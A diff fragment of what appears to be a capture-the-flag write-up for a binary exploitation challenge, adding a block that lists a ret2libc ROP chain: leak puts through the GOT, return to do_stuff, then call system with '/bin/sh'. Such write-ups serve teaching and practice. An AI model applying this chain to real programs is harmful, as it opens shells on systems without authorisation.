@@ -294,6 +294,17 @@ sh.interactive()
 26. The program crashed, after analyzing my script, found the problem is at the 1st payload.
 27. We need to add 1 more payload, for this solution i used `do_stuff()` address, it shall do the loops to forbid the binary crashed. But you can make it return to the `main()` function if you want to. It gave me the same result.
 
+```
+offset,
+pop_rdi,
+puts_got,
+puts_plt,
+do_stuff_sym,
+pop_rdi,
+bin_sh,
+system_address
+```
+
 > THE SCRIPT (FINAL)
 
 ```py
